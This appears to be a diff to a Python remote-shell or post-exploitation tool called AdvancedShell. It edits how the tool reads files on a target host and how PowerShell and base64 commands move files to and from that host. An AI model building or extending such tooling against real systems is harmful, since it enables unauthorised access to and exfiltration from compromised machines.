@@ -663,10 +663,12 @@ class AdvancedShell:
 
     def post_cat(self,filepath):
         """Read a file cross-platform."""
+        # Convert backslashes to forward slashes for Windows paths
+        fp=filepath.replace('\\','/') if self.target_os=='windows' else filepath
         if self.target_os=='windows':
-            o=self.execute(f'type "{filepath}"')
+            o=self.execute(f'type "{fp}"')
         else:
-            o=self.execute(f'cat "{filepath}"')
+            o=self.execute(f'cat "{fp}"')
         if o:print(o)
         else:print(f"{R}Could not read file{W}")
 
@@ -862,7 +864,7 @@ class AdvancedShell:
                         chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
                         if self.target_os=='windows':
                             if len(chunks)==1:
-                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\"{rp_safe}\",[Convert]::FromBase64String(\"{b64}\"))"')
+                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp_safe}\',[Convert]::FromBase64String(\'{b64}\'))"')
                             else:
                                 tmp=rp_safe+'.b64'
                                 for i,chunk in enumerate(chunks):
@@ -894,7 +896,7 @@ class AdvancedShell:
                         rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                         print(f"{Y}[*] Downloading {rp}...{W}")
                         if self.target_os=='windows':
-                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"{rp_safe}\"))"')
+                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{rp_safe}\'))"')
                         else:
                             o=self.execute(f"base64 -w0 '{rp_safe}'")
                         if o and '[-]' not in o and '[!' not in o:
